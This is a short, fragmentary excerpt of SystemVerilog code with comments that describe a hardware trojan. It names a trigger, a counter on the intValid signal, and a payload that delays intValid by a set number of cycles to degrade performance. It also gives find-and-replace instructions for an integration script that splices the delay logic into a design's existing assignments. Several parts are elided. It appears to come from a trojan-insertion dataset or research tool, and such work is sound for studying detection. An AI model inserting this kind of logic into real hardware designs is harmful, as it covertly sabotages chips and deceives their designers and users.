 ...
 *   
 * Trigger: Counter on intValid
 * Payload: Delay intValid by N cycles
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_active && intValid) begin
...
// ============================================================
// Performance Degradation: Delay intValid by DELAY_CYCLES
//
// Integration Script Must Modify:
//
// IF intValid is a ready/valid signal:
//   Find: assign intValid = ready_condition;
//   Replace: assign intValid = (delay_counter == 0) ? ready_condition : 1'b0;
//
// IF intValid is in always_ff:
//   Find: intValid <= ready_value;
//   Replace: intValid <= (delay_counter == 0) ? ready_value : 1'b0;